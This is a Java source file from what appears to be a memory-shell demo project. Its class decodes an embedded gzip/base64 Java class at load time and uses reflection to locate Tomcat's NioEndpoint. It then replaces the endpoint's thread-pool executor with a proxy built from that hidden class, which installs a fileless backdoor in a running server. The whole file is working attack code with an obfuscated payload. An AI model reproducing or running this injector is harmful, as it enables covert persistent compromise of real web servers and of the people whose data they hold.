package com.demo.memshell.loader;


import java.io.ByteArrayInputStream;
import java.io.ByteArrayOutputStream;
import java.io.IOException;
import java.lang.reflect.*;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.*;
import java.util.concurrent.BlockingQueue;
import java.util.concurrent.Executor;
import java.util.concurrent.TimeUnit;
import java.util.zip.GZIPInputStream;

/**
 * @author Whoopsunix
 * ExecutorMS 8
 */
public class ExecutorThreadLoader {
    private static String gzipObject = "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";
    private static Object object = null;
    private static String CLASSNAME = null;

    public ExecutorThreadLoader() {
    }

    static {
        try {
            getObject();

            // 获取
            Object nioEndpoint = getTargetObject("org.apache.tomcat.util.net.NioEndpoint");

            if (!isInject(nioEndpoint)) {
                inject(nioEndpoint);
            }

        } catch (Throwable e) {

        }
    }

    public static boolean isInject(Object nioEndpoint) throws Exception {
        Object threadPoolExecutor = getFieldValue(nioEndpoint, "executor");
        if (threadPoolExecutor instanceof Proxy) {
            Object h = getFieldValue(threadPoolExecutor, "h");
            if (h.getClass().getName().equalsIgnoreCase(CLASSNAME)) {
                return true;
            }
        }

        // ms
        Object var1 = invokeMethod(threadPoolExecutor, "getCorePoolSize", new Class[]{}, new Object[]{});
        Object var2 = invokeMethod(threadPoolExecutor, "getMaximumPoolSize", new Class[]{}, new Object[]{});
        Object var3 = invokeMethod(threadPoolExecutor, "getKeepAliveTime", new Class[]{TimeUnit.class}, new Object[]{TimeUnit.MILLISECONDS});
        Object var4 = TimeUnit.MILLISECONDS;
        Object var5 = invokeMethod(threadPoolExecutor, "getQueue", new Class[]{}, new Object[]{});

        Class ThreadPoolExecutorClass = Class.forName("org.apache.tomcat.util.threads.ThreadPoolExecutor");
        Object executor = ThreadPoolExecutorClass.getConstructor(Integer.TYPE, Integer.TYPE, Long.TYPE, TimeUnit.class, BlockingQueue.class).newInstance(var1, var2, var3, var4, var5);

        byte[] bytes = decompress(gzipObject);
        ClassLoader classLoader = Thread.currentThread().getContextClassLoader();
        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, Integer.TYPE, Integer.TYPE);
        defineClass.setAccessible(true);
        Class clazz = null;
        try {
            clazz = (Class) defineClass.invoke(classLoader, bytes, 0, bytes.length);
        } catch (Exception e) {
            clazz = classLoader.loadClass(CLASSNAME);
        }
        Constructor constructor = clazz.getDeclaredConstructor(Object.class);
        constructor.setAccessible(true);
        Object javaObject = constructor.newInstance(executor);

        object = Proxy.newProxyInstance(ExecutorThreadLoader.class.getClassLoader(), new Class[]{Executor.class}, (InvocationHandler) javaObject);

        return false;
    }

    public static void inject(Object nioEndpoint) throws Exception {
        if (object == null)
            return;

        nioEndpoint.getClass().getSuperclass().getSuperclass().getMethod("setExecutor", Executor.class).invoke(nioEndpoint, object);
    }

    public static void getObject() throws Exception {
        byte[] bytes = decompress(gzipObject);
        URLClassLoader urlClassLoader = new URLClassLoader(new URL[0], Thread.currentThread().getContextClassLoader());
        Method defMethod = ClassLoader.class.getDeclaredMethod("defineClass", byte[].class, int.class, int.class);
        defMethod.setAccessible(true);
        Class cls = (Class) defMethod.invoke(urlClassLoader, bytes, 0, bytes.length);
        CLASSNAME = cls.getName();
    }

    public static byte[] decompress(String gzipObject) throws IOException {
        final byte[] compressedData = new sun.misc.BASE64Decoder().decodeBuffer(gzipObject);
        ByteArrayInputStream bais = new ByteArrayInputStream(compressedData);
        try {
            GZIPInputStream gzipInputStream = new GZIPInputStream(bais);
            ByteArrayOutputStream baos = new ByteArrayOutputStream();
            byte[] buffer = new byte[1024];
            int len;
            while ((len = gzipInputStream.read(buffer)) > 0) {
                baos.write(buffer, 0, len);
            }
            return baos.toByteArray();
        } catch (Exception e) {

        }
        return null;
    }

    public static Object getFieldValue(final Object obj, final String fieldName) throws Exception {
        final Field field = getField(obj.getClass(), fieldName);
        return field.get(obj);
    }

    public static Field getField(final Class<?> clazz, final String fieldName) {
        Field field = null;
        try {
            field = clazz.getDeclaredField(fieldName);
            field.setAccessible(true);
        } catch (NoSuchFieldException ex) {
            if (clazz.getSuperclass() != null)
                field = getField(clazz.getSuperclass(), fieldName);
        }
        return field;
    }

    public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
        Method method;
        try {
            method = obj.getClass().getDeclaredMethod(methodName, argsClass);
        } catch (NoSuchMethodException e) {
            method = obj.getClass().getSuperclass().getDeclaredMethod(methodName, argsClass);
        }
        method.setAccessible(true);
        Object object = method.invoke(obj, args);
        return object;
    }

    public static Object getTargetObject(String className) throws Exception {
        List<ClassLoader> activeClassLoaders = new ExecutorThreadLoader().getActiveClassLoaders();

        Class cls = getTargetClass(className, activeClassLoaders);

        // 死亡区域 已检查过的类
        HashSet breakObject = new HashSet();
        breakObject.add(System.identityHashCode(breakObject));

        // 原始类型和包装类都不递归
        HashSet<String> breakType = new HashSet(Arrays.asList(int.class.getName(), short.class.getName(), long.class.getName(), double.class.getName(), byte.class.getName(), float.class.getName(), char.class.getName(), boolean.class.getName(), Integer.class.getName(), Short.class.getName(), Long.class.getName(), Double.class.getName(), Byte.class.getName(), Float.class.getName(), Character.class.getName(), Boolean.class.getName(), String.class.getName()));

        Object result = getTargetObject(cls, Thread.currentThread(), breakObject, breakType, 30);

        return result;
    }

    /**
     * 遍历 ClassLoader 加载目标 Class
     */
    public static Class getTargetClass(String className, List<ClassLoader> activeClassLoaders) {
        for (ClassLoader activeClassLoader : activeClassLoaders) {
            try {
                return Class.forName(className, true, activeClassLoader);
            } catch (Throwable e) {

            }
        }
        return null;
    }

    /**
     * 获取活跃线程
     */
    public List<ClassLoader> getActiveClassLoaders() throws Exception {
        Set<ClassLoader> activeClassLoaders = new HashSet();

        // 加载当前对象的加载器
        activeClassLoaders.add(this.getClass().getClassLoader());

        // 当前线程的上下文类加载器
        activeClassLoaders.add(Thread.currentThread().getContextClassLoader());

//        // 应用程序类加载器
//        ClassLoader systemClassLoader = ClassLoader.getSystemClassLoader();
//        activeClassLoaders.add(systemClassLoader);
//
//        // 扩展类加载器
//        activeClassLoaders.add(systemClassLoader.getParent());

        // 获取线程组
        ThreadGroup threadGroup = Thread.currentThread().getThreadGroup();
        Thread[] threads = new Thread[threadGroup.activeCount()];
        int count = threadGroup.enumerate(threads, true);
        for (int i = 0; i < count; i++) {
            activeClassLoaders.add(threads[i].getContextClassLoader());
        }

        return new ArrayList(activeClassLoaders);
    }

    /**
     * 递归查找属性
     */
    public static Object getTargetObject(Class targetCls, Object object, HashSet breakObject, HashSet<String> breakType, int maxDepth) {
        // 最大递归深度
        maxDepth--;
        if (maxDepth < 0) {
            return null;
        }

        if (object == null) {
            return null;
        }

        // 寻找到指定类返回
        if (targetCls.isInstance(object)) {
            return object;
        }

        // 获取内存地址，来标识唯一对象
        Integer hash = System.identityHashCode(object);

        if (breakObject.contains(hash)) {
            return null;
        }
        breakObject.add(hash);

        // 获取对象所有 Field
        Field[] fields = object.getClass().getDeclaredFields();
        ArrayList fieldsArray = new ArrayList();
        Class objClass = object.getClass();
        while (objClass != null) {
            Field[] superFields = objClass.getDeclaredFields();
            fieldsArray.addAll(Arrays.asList(superFields));
            objClass = objClass.getSuperclass();
        }
        fields = (Field[]) fieldsArray.toArray(new Field[0]);


        for (Field field : fields) {
            try {
                Class type = field.getType();

                if (breakType.contains(type.getName())) {
                    continue;
                }

                // 获取 Field 值
                field.setAccessible(true);
                Object value = field.get(object);
                Object result = null;

                // 递归查找
                if (value instanceof Map) {
                    // Map 的 kv 都要遍历
                    Map map = (Map) value;
                    for (Object o : map.entrySet()) {
                        Map.Entry entry = (Map.Entry) o;
                        result = getTargetObject(targetCls, entry.getKey(), breakObject, breakType, maxDepth);
                        if (result != null) {
                            break;
                        }
                        result = getTargetObject(targetCls, entry.getValue(), breakObject, breakType, maxDepth);
                        if (result != null) {
                            break;
                        }
                    }
                } else if (value instanceof Iterable) {
                    // 集合的元素都要遍历
                    Iterable iterable = (Iterable) value;
                    for (Object o : iterable) {
                        result = getTargetObject(targetCls, o, breakObject, breakType, maxDepth);
                        if (result != null) {
                            break;
                        }
                    }
                } else if (type.isArray()) {
                    // 数组的元素都要遍历
                    Object[] array = (Object[]) value;
                    for (Object o : array) {
                        result = getTargetObject(targetCls, o, breakObject, breakType, maxDepth);
                        if (result != null) {
                            break;
                        }
                    }
                } else {
                    result = getTargetObject(targetCls, value, breakObject, breakType, maxDepth);
                }

                if (result != null) {
                    return result;
                }
            } catch (Throwable e) {

            }
        }

        return null;
    }

}
